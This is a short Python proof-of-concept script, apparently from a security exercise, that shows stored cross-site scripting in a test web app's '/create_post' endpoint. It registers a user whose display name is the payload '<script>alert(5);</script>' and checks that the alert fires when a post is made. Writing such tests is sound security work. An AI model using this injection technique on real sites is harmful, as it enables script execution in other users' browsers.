# vuln6.py

# PoC for Cross-Site Scripting on the /create_post endpoint
#
# It is possible to change a user's name to a script, which will run when their name is displayed, including when they create a new post.

from tools import *
import sys
import os

debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'

url = sys.argv[1]

session = FaceFiveSession(url)

user = 'test'
passwd = 'testpasswd'
content = '<script>alert(5);</script>'

reset_image(session)
register(session, user, passwd)
update_user_script(session, passwd, user, name=content)

alertText = create_post_script(session, content)
assert "5" in alertText

